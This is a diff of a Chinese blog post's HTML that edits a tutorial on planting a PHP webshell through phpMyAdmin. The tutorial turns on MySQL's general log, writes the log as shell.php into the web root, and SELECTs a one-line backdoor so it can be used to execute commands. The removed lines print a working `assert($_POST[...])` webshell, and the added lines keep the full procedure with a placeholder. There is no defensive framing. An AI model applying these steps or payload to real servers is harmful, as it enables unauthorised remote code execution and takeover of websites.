@@ -172,7 +172,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-10-06 10:22:57 / 修改时间：10:23:32" itemprop="dateCreated datePublished" datetime="2021-10-06T10:22:57+08:00">2021-10-06</time>
+              <time title="创建时间：2021-10-06 10:22:57 / 修改时间：10:47:20" itemprop="dateCreated datePublished" datetime="2021-10-06T10:22:57+08:00">2021-10-06</time>
             </span>
 
           
@@ -197,11 +197,10 @@
 <p><a target="_blank" rel="noopener" href="http://localhost/phpMyAdmin/">set general_log =’on’;</a> 状态设置为打开。默认为关闭</p>
 <p>set global general_log_file=’E:/oldphpstday/WWW/shell.php’;</p>
 <p>将路径设置为网站目录，并命名为shell.php</p>
-<p>我们现在写入一句话~ 强调一下，SQL就是SQL，在保存到日志中的时候不会解析转译符号，不知道大家能否理解，我举一个例子：</p>
 <p>我们查询：</p>
-<p>SELECT ‘<?php assert(_POST['admin']);?>‘;<br>php这边解析的时候就会报错，因此我们采用单引号与双引号公用的方式实现：</p>
-<p>SELECT ‘<?php assert($_POST["admin"]);?>‘;</p>
-<p>POST中不用引号也可以~</p>
+<p>SELECT ‘一句话木马’ ;</p>
+<p>POST中不用引号也可以</p>
+<p>之后在网站的个目录找到shell.php 就可以命令执行了 .</p>
 
       
     </div>
